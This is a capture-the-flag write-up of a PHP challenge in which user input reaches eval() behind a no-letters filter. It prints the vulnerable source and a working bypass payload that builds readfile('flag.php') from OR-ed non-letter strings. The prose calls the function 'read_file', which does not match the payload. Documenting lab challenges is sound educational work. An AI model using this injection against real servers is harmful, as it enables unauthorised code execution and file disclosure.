# Web Warm-up

<https://ctftime.org/writeup/22121>  

We are given a url <http://69.90.132.196:5003/?view-source> which greets us with this PHP script. We want to get contents of a file `flag.php` in this task.

```php
<?php
if(isset($_GET['view-source'])){
    highlight_file(__FILE__);
    die();
}

if(isset($_GET['warmup'])){
    if(!preg_match('/[A-Za-z]/is',$_GET['warmup']) && strlen($_GET['warmup']) <= 60) {
    eval($_GET['warmup']);
    }else{
        die("Try harder!");
    }
}else{
    die("No param given");
}
?>
```

We control a parameter `warmup` which is passed through `eval()` function, and is executed as PHP code.  
We can't use any alphabets in over payload, so we use the fact that in PHP, we can use bitwise operators on 2 strings, which will be applied to each of their characters individually. And that function names can also be strings.  

We can send this payload as `warmup`, but wriiten as some operation of 2 strings that don't use any alphabets.

```php
read_file('flag.php')
```

We can write a script to generate the payload (`gen.py`) which generates  

```php
("2%!$&),%"|"@@@@@@@@")("&,!@$0(0"|"@@@'*@@@");
```

and use it to get the flag
`ASIS{w4rm_up_y0ur_br4in}`
